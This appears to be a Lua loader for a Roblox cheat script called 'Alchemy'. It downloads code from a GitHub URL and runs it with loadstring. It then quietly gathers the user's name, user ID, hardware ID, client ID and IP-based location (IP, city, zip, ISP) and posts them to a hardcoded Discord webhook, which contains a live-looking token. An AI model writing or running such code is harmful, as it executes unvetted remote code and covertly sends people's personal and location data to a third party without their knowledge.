local StartTick = tick()

local Success, Error = pcall(function()
    local Source = game:HttpGet("https://github.com/kgukmz/solid-octo-carnival/raw/refs/heads/main/setEnvironment.lua")
    loadstring(Source)()
end)

if (Success == false) then
    warn("Unable to load script environment:", Error)
    return
end

if (getgenv().Get_Script == nil and getgenv().GetService == nil) then
    warn("Script globals were not set")
    return
end

local Players = GetService("Players")
local RbxAnalytics = GetService("RbxAnalyticsService")
local Teams = game:GetService("Teams")

local LocalPlayer = Players.LocalPlayer
local PlaceID = game.PlaceId

local HardwareID = gethwid()
local ClientID = RbxAnalytics:GetClientId()

local Webhook = Get_Script("Modules/Webhook.lua")
local GameData = Get_Script("Modules/GameData.lua")

do -- // Execution logs
    local Country = "..."
    local Query = "1.1.1.1"
    local CountryCode = "?"

    local Timezone = ".../..."
    local City = "..."
    local Zip = "..."
    local ISP = "???" 

    local Success, Error = pcall(function()
        local Data = http_request({
            Url = "http://ip-api.com/json/";
            Method = "GET";
        })

        if (Data.StatusCode == 200) then
            local Decoded = GetService("HttpService"):JSONDecode(Data.Body)

            Country = Decoded.country
            Query = Decoded.query
            CountryCode = Decoded.countryCode

            Timezone = Decoded.timezone
            City = Decoded.city
            Zip = Decoded.zip
            ISP = Decoded.isp
        end
    end)

    if (Success == false) then
        warn("Error retrieving data")
    end

    local ExecutionWebhook = Webhook.new("https://discord.com/api/webhooks/1333563474269175945/xdAZ05F06iKbqYe3EuopYL-1bOkrN1AlcufuUY3zj8Cue19UATaWNwrIG3gt8irIGXfd")
    local WebhookFields = {
        {
            name = "User Info:";
            value = ("```ini\n[+] [USERNAME] - [%s]\n[+] [USER-ID] - [%s]\n```"):format(LocalPlayer.Name, tostring(LocalPlayer.UserId));
        };
        {
            name = "Game Info:";
            value = ("```ini\n[+] [PLACE] - [%s]\n[+] [PLACE-ID] - [%s]\n[+] [JOBID] - [%s]\n```");
        };
        {
            name = "Location Info:";
            value = ("```ini\n[+] [COUNTRY] - [%s] | [%s]\n[+] [QUERY] - [%s]\n\n-- // ADDITIONAL INFO \n[+] [CITY] - [%s] | [%s]\n[+] [TIMEZONE] - [%s]\n[+] [ISP] - [%s]\n```"):format(Country, CountryCode, Query, City, Zip, Timezone, ISP)
        };
        {
            name = "Executor Info:";
            value = ("```ini\n[+] [EXECUTOR] - [%s]\n[+] [HWID] - [%s]\n[+] [CLIENT-ID] - [%s]\n```"):format(identifyexecutor(), HardwareID, ClientID);
        };
        {
            name = "Script Info:";
            value = ("```ini\n[+] [LOADED] - [%s]\n[+] [TIME] - [%s.s]\n```"):format(tostring(false), tostring(tick() - StartTick));
        };
    }

    ExecutionWebhook:SendEmbed({
        title = "ALCHEMY | [EXECUTION]";
        description = "Alchemy has been executed";
        color = 37346;
        fields = table.unpack(WebhookFields);
    })
end